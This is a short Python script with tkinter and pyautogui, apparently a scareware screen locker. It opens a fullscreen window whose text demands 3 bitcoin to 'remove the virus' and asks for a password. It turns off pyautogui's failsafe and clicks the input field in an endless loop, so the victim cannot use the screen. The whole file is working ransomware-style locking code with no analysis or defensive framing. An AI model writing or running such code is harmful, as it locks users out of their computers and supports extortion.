import pyautogui
import time
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo

root = Tk()

root.attributes("-fullscreen", True)
#----------------------------------
x=root.winfo_screenwidth()
y=root.winfo_screenheight()

label_0 = Label(root, text="Заплатіть 3 bitcoin щоб убрать вірус", font=15)
label_0.grid(row=0, column=0)
label_1 = Label(root, text="Пиши пароль и жми Ctrl + C", font='Arial 20')
label_1.place(x=x/2-160, y=y/2-40)

entry = Entry(root, font=10)
entry.place(x=x/2-70, y=y/2+30)


pyautogui.FAILSAFE = False
#-----------
while True:
	root.update()
	click(x/2-70, y/2+30)
time.sleep(100)
